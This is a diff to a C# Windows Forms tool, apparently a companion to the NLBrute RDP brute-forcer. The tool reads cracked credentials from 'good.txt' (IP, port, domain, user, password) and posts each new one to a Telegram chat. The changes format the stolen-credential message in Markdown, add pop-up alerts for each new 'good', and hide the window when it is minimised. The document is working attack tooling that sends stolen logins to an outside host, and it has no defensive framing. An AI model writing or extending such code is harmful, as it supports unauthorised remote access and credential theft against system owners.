@@ -8,7 +8,7 @@ using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace WindowsFormsApp1
+namespace NlBrute_GoodSender
 {
     public partial class Form1 : Form
     {
@@ -70,11 +70,12 @@ namespace WindowsFormsApp1
                     string[] FileGood = File.ReadAllLines("good.txt");
                     foreach (var n in FileGood)
                     {
-                        if (!Sended.Exists(x => x == n))
+                        if (!Sended.Exists(x => x == n)&&n!="")
                         {
                             Sended.Add(n);
+                            notifyIcon1.ShowBalloonTip(3000, "Good_Found", n, ToolTipIcon.Info);
                             var Temp = Regex.Match(n, @"^(.*?):(.*?)@(.*?)\\(.*?);(.*)").Groups;
-                            string MessageTelegram = $"🌐 IP Address: {Temp[1].Value}\r\n💠 PORT: {Temp[2].Value}\r\n⚔️ Domain: {Temp[3].Value}\r\n👤 USER: {Temp[4].Value}\r\n♨️ PASSWORD: {Temp[5].Value}";
+                            string MessageTelegram = $"🌐 IP Address: `{Temp[1].Value}`\n💠 PORT: `{Temp[2].Value}`\n🌐 FullAddress:`{Temp[1].Value}:{Temp[2].Value}` \n⚔️ Domain: `{Temp[3].Value}`\n👤 USER: `{Temp[4].Value}`\n♨️ PASSWORD: `{Temp[5].Value}`";
                             await SendTelegramMessage(MessageTelegram);
                         }
                     }
@@ -89,7 +90,8 @@ namespace WindowsFormsApp1
             var content = new FormUrlEncodedContent(new[]
             {
             new KeyValuePair<string, string>("chat_id", CHATID_USER.ToString()),
-            new KeyValuePair<string, string>("text", messageText)
+            new KeyValuePair<string, string>("text",messageText),
+            new KeyValuePair<string, string>("parse_mode","MarkdownV2")
             });
 
             await client.PostAsync(sendMessageUrl, content);
@@ -120,6 +122,14 @@ namespace WindowsFormsApp1
                 this.Show();
                 this.WindowState = FormWindowState.Normal;
                 
+            }
+        }
+
+        private void Form1_Resize(object sender, EventArgs e)
+        {
+            if (this.WindowState == FormWindowState.Minimized)
+            {
+                this.Hide();
             }
         }
     }
